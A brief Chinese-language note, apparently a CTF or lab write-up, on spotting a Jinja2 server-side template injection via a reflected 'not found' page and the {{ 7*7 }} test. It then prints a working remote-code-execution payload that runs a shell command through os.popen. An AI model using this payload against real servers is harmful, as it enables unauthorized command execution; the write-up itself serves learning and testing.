## 分析

当随意访问一个路径时候，比如： `http://1.2.3.4/x`

页面会返回 `x` 不存在，不是标准的 `404` 错误，那么可以判断是一个 `SSTI` 漏洞
使用 `{{ 7*7 }}`， 返回 `49`

那么可以直接使用 `payload `
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

# 参考链接
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution)
